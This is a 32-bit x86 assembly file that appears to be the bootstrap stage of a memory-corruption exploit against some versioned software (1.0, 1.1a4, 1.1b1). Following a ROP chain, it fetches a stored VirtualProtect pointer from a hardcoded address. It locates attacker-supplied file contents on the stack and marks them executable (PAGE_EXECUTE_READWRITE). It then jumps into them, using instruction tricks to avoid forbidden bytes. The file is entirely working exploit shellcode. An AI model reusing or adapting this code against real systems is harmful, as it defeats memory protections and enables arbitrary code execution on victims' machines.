[bits 32]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Initialization: Prep ESP fixes                                       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mov eax,esp			;; save current esp
sub eax,0xFFFFFF30	;; position at location of return addr (+D0)
;; for st, return address is already set up. no need to modify
;; note that this location is valid for 1.1b1 + 1.1a4
;; however 1.0 requires additional work. location of return address is a bit different.
;; the additional work is all done in finalization in the Loader step.

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Bootstrap: VirtualProtect and JMP to file contents                   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Ref to current file sits at esp - 0x408 using the compatibility ROP chain
;; file contents are completely loaded here, minimal limitations on characters.
;; free to run loader.

;; 1. fetch VirtualProtect function pointer into EBX
;; during ROP, this was stored at 0x67BD0324
mov ebx,0x67BD0324	;; pointer to the VirtualProtect function
mov ebx,dword [ebx]	;; fetch the function address

;; 2. fetch file start address into EDX
xor edx,edx			;; clear edx
mov edx,esp			;; get esp into edx
add edx,0xFFFFFBF8	;; esp - 0x408
mov edx,dword [edx]	;; follow pointer
xor ecx,ecx			;; clear ecx
sub ecx,0xFFFFFFFC	;; set ecx == 0x04
add edx,ecx			;; required as we cannot use `add edx,0x04`
mov edx,dword [edx]	;; follow pointer

;; 3. setup stack
xor ecx,ecx
xor esi,esi
sub ecx,0xFFFFFFFC				;; set ecx == 0x04
mov dword [esp],eax				;; pseudo-push eax - saves the value of stack + D0
sub esp,ecx						;; next stack entry
mov dword [esp],0x67BD0334		;; lpflOldProtect
sub esp,ecx						;; next stack entry
sub esi,0xFFFFFFC0				;; set esi == 0x40
mov dword [esp],esi				;; flNewProtect
sub esp,ecx						;; next stack entry
imul esi,esi,0x10				;; set esi == 0x400
mov dword [esp],esi				;; dwSize
sub esp,ecx						;; next stack entry
mov dword [esp],edx				;; lpAddress
sub esp,ecx						;; next stack entry
mov dword [esp],edx				;; return address
jmp ebx							;; call VirtualProtect
